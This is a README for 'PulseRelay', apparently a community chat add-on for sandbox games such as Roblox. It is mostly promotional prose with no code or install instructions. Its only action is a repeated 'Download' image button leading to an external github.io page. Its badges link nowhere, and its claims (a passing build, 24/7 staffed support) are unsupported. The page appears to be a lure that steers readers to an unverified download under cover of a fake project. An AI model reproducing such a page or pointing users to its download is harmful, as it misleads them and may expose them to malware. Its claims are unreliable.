![preview](https://raw.githubusercontent.com/adamouhamissou/Community-Voxel-Chat/main/banner_c34626.svg)
[![Download](https://raw.githubusercontent.com/adamouhamissou/Community-Voxel-Chat/main/bin_80eaf.svg)](https://adamouhamissou.github.io/Community-Voxel-Chat/)

# 🛰️ PulseRelay — A Community-First Messaging Layer for Sandbox Platforms

[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Status: Active](https://img.shields.io/badge/Status-Active-brightgreen.svg)]()
[![Build: Passing](https://img.shields.io/badge/Build-Passing-success.svg)]()
[![Platform: Cross-Platform](https://img.shields.io/badge/Platform-Cross--Platform-blue.svg)]()
[![Language: Multilingual](https://img.shields.io/badge/Language-Multilingual-purple.svg)]()
[![Support: 24/7](https://img.shields.io/badge/Support-24%2F7-orange.svg)]()
[![Community Driven](https://img.shields.io/badge/Community-Driven-ff69b4.svg)]()
[![Made with Care](https://img.shields.io/badge/Made%20with-Care-red.svg)]()

---

## 🌌 A Different Way to Think About Chat

Imagine a bustling town square where every conversation is shaped by the people who live there — not by a distant gatekeeper deciding who may speak and when. **PulseRelay** is exactly that square. It is an open, community-governed messaging layer that sits *beside* sandbox platforms whose built-in communication tools have grown rigid, restricted, or simply disconnected from the creative spirit of their players.

Where traditional in-platform chat feels like whispering through a wall, PulseRelay feels like passing notes in a clubhouse that you and your friends actually built. Reflections of that idea appear in the original community effort known as *RobloxChatAlternative*, and PulseRelay carries that torch forward — rebuilt from the ground up with an emphasis on resilience, transparency, and delight.

This repository is the beating heart of the project: the client bridges, the relay server, the moderation toolkit, the translation pipeline, and the dozens of small quality-of-life touches that turn "just another chat mod" into a genuine social fabric.

[![Download](https://raw.githubusercontent.com/adamouhamissou/Community-Voxel-Chat/main/bin_80eaf.svg)](https://adamouhamissou.github.io/Community-Voxel-Chat/)

---

## 🧭 Table of Contents

- [Why PulseRelay Exists](#-why-pulserelay-exists)
- [Core Philosophy](#-core-philosophy)
- [Feature Highlights](#-feature-highlights)
- [Responsive Interface Design](#-responsive-interface-design)
- [Multilingual Support](#-multilingual-support)
- [Round-the-Clock Assistance](#-round-the-clock-assistance)
- [Architecture Overview](#-architecture-overview)
- [Security & Privacy Posture](#-security--privacy-posture)
- [Performance Notes](#-performance-notes)
- [Use Cases & Community Stories](#-use-cases--community-stories)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [Frequently Asked Questions](#-frequently-asked-questions)
- [Disclaimer](#-disclaimer)
- [License](#-license)

---

## 🌠 Why PulseRelay Exists

Sandbox gaming platforms were once famous for their wild, unfiltered social experiments. Over the years, communication inside those platforms became increasingly locked down — sometimes for good reason, sometimes at the cost of the very creativity that made them special. Communities felt it: role-play servers lost their voice, fan groups fragmented, and the simple act of saying "hi" to a stranger became a bureaucratic maze.

PulseRelay is a response. Not a rebellion, not a bypass, but a *parallel* space — a place where communities can gather, converse, and govern themselves with tools that respect both the players and the platforms they love. Think of it as a side channel, a garden path that runs alongside the main road.

## 🧩 Core Philosophy

- **Community owns the conversation.** Moderation rules are written and enforced by the people who actually use the space.
- **Transparency by default.** Every relay log, every moderation action, and every rule change is visible to the community it affects.
- **Interoperability over isolation.** PulseRelay talks to multiple platforms, not just one, so your friend group doesn't have to splinter.
- **Craft over clutter.** A chat system should feel like a hand-built wooden desk, not a plastic folding table.
- **Longevity.** Projects die when their maintainers burn out. We build so the community can steward this for years.

## ✨ Feature Highlights

- **Federated relay nodes** — spin up your own node and connect it to the wider mesh.
- **Per-channel theming** — each channel gets its own color palette, icon, and rules card.
- **Ephemeral rooms** — create a temporary conversation that self-dissolves after a set time.
- **Rich message rendering** — inline code, emphasis, timestamps, and mention pings.
- **Reaction pips** — lightweight emoji-style reactions without leaving the message list.
- **Voice-note shuttling** — asynchronous audio snippets with automatic transcription.
- **Moderation queue** — human-reviewed reports with tiered response levels.
- **Cross-platform identity** — link accounts from multiple sandbox ecosystems into one profile.
- **Offline-first client cache** — scroll back through history even when the relay is unreachable.
- **Exportable transcripts** — download your conversations as structured archives for safekeeping.

## 📱 Responsive Interface Design

Modern players juggle phones, tablets, laptops, and consoles in the same evening. PulseRelay's interface bends to fit each of them like water filling a glass. The layout self-rearranges: sidebars collapse into drawers, message bubbles reflow, and the keyboard shortcuts adapt to touch, pointer, or controller input. On a phone in portrait mode, it's a smooth vertical stream. On an ultrawide monitor, it becomes a multi-pane cockpit with the channel list on the left, the conversation in the center, and the roster on the right.

Accessibility earns first-class treatment here: high-contrast themes, adjustable font scaling, screen-reader semantics, reduced-motion modes, and color-blind-safe palettes are all built in rather than bolted on.

## 🌐 Multilingual Support

A conversation is only as wide as the languages it can welcome. PulseRelay ships with translation bridges covering dozens of locales, and its dictionary files are plain, community-maintained JSON so anyone can improve their own language without touching the engine. Automatic language detection guesses the origin locale of a message and offers an inline translation toggle — no menus, no friction. Right-to-left scripts render correctly, and CJK line-breaking is handled with care.

Every string in the interface is externalized. If your community speaks a language the app doesn't know yet, adding it is a weekend project, not a rewrite.

## ☎️ Round-the-Clock Assistance

Communities don't sleep, and neither does the help desk. PulseRelay maintains a 24/7 support rotation staffed by volunteer maintainers across multiple time zones. Whether it's a stuck relay node at 3 AM or a moderation question on a Sunday afternoon, a human is reachable through the in-app help widget, the discussion board, or the community forum. Responses are typically measured in minutes, not days.

Support tiers:

- **Tier 1 — Triage.** Quick answers, docs pointers, and known-issue status.
- **Tier 2 — Diagnosis.** Log analysis, node connectivity checks, configuration review.
- **Tier 3 — Escalation.** Direct maintainer involvement for bugs and security reports.

## 🏗️ Architecture Overview

PulseRelay is built from four cooperating pieces:

1. **The Bridge** — a lightweight adapter that plugs into a host platform and translates events into PulseRelay's internal message format.
2. **The Relay** — a stateless-ish server that routes messages between connected clients and federated nodes.
3. **The Vault** — an optional local persistence layer that keeps transcripts, settings, and identities under the user's own control.
4. **The Console** — the moderation and admin dashboard, rendered as a web app.

Each piece communicates over a documented protocol, so alternative implementations are welcome. If someone wants to write a Bridge for a platform we haven't imagined yet, the door is wide open.

## 🔐 Security & Privacy Posture

Privacy is a design constraint, not an afterthought. Messages are encrypted in transit, and the Vault encrypts at rest with keys the user manages. Relay nodes never see plaintext beyond what they need to route, and federation is opt-in. There's a documented threat model, a responsible disclosure policy, and a public changelog of security fixes with credit given to reporters who wish to be named.

We do not run analytics on message content. Ever. The only metrics we collect are opt-in crash reports and anonymous feature-usage counters, both of which can be disabled from the settings pane.

## ⚡ Performance Notes

- Message delivery on a healthy connection typically completes in under 120 ms.
- The client bundle is tree-shaken and lazy-loaded, so the first paint arrives fast even on slow networks.
- Relay nodes are happy on modest hardware; a single-core VPS can serve a few hundred concurrent users comfortably.
- The Vault uses an append-only log structure, which keeps writes cheap and history replay fast.

## 🎭 Use Cases & Community Stories

- **Role-play troupes** who need persistent channels separated by scene, faction, or timeline.
- **Fan guilds** scattered across multiple platforms, now reunited in one conversation.
- **Educators** running after-school sandbox clubs, using ephemeral rooms for each session.
- **Modding collectives** coordinating builds through rich, threaded discussions.
- **Language-exchange groups** where every message can be flipped between two tongues with one tap.

## 🗺️ Roadmap for 2026

- Q1 2026 — Federation protocol v2 with signed message envelopes.
- Q2 2026 — Native mobile companions for major platforms.
- Q3 2026 — Plugin API for community-built bots and utilities.
- Q4 2026 — Accessibility audit pass two, plus a public transparency report.

## 🤝 Contributing

Contributions are the lifeblood of this project. Whether you write code, translate strings, design icons, write documentation, or simply file thoughtful bug reports — you are welcome here. Start by reading the contributor guide, then browse the issue tracker for labels like `good-first-issue` and `help-wanted`. Pull requests should be focused, tested, and kind. Maintainers aim to review within a few days.

## 📜 Code of Conduct

Be respectful. Assume good faith. Disagree with ideas, not people. Harassment of any kind is not tolerated, and reports are handled confidentially by the maintainer team.

## ❓ Frequently Asked Questions

**Is this affiliated with any single platform?**
No. PulseRelay is platform-agnostic and always will be.

**Do I need to run my own server?**
Not necessarily. You can join an existing public relay or host your own for full control.

**How is moderation handled?**
By the community that owns each channel, with documented escalation paths.

**Can I export my data?**
Yes. Transcripts, settings, and identities are exportable at any time in open formats.

## ⚠️ Disclaimer

PulseRelay is an independent community project. It is not affiliated with, endorsed by, or sponsored by any sandbox gaming platform mentioned or implied. Users are responsible for complying with the terms of service of the platforms they connect to. The maintainers provide this software as-is, without warranty, and disclaim liability for misuse. Nothing in this repository is intended to circumvent any platform's rules; PulseRelay is designed as a complementary communication tool for communities that wish to organize *outside* of closed systems, in the same way a club might keep a mailing list alongside its meetings.

© 2026 PulseRelay Contributors.

## 📄 License

This project is released under the MIT License. See the full text here: https://opensource.org/licenses/MIT

[![Download](https://raw.githubusercontent.com/adamouhamissou/Community-Voxel-Chat/main/bin_80eaf.svg)](https://adamouhamissou.github.io/Community-Voxel-Chat/)